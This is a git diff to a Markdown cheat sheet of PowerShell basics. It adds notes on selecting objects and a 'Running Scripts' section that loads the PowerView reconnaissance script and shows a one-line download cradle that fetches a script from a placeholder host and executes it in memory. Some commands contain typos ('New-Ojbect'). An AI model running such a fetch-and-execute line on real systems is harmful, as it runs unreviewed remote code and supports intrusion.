@@ -61,7 +61,6 @@
 	#print content of the file; cat
 	Get-Content filename
 	```
-
 ## Classes and Objects
 * Creating a Class in Powershell
 	```powershell
@@ -107,6 +106,9 @@
 	
 	# print all property of an object
 	$myobject | Select-Object -Property *
+
+	# Alisas for Select-Ojbect
+	Get-ChildItem | select Name, Parent
 	```
 * Filtering Objects
 	```powershell
@@ -131,3 +133,20 @@
 	# Prints secific property
 	Get-Childitem | Format-Table -Property Name,Parent
 	```
+## Running Scripts
+- Local Scripts
+```powershell
+# dot source
+. .\Tools\Powerview.ps1
+
+# Using cmdlet
+Import-Module C:\Tools\Powerview.ps1
+
+# Get commands imported by a module
+Get-Command -Module <ModuleName>
+
+```
+- Remote Scripts
+```powershell
+iex (New-Ojbect Net.webClient).DownloadString('https://server.com/powerview.ps1')
+```
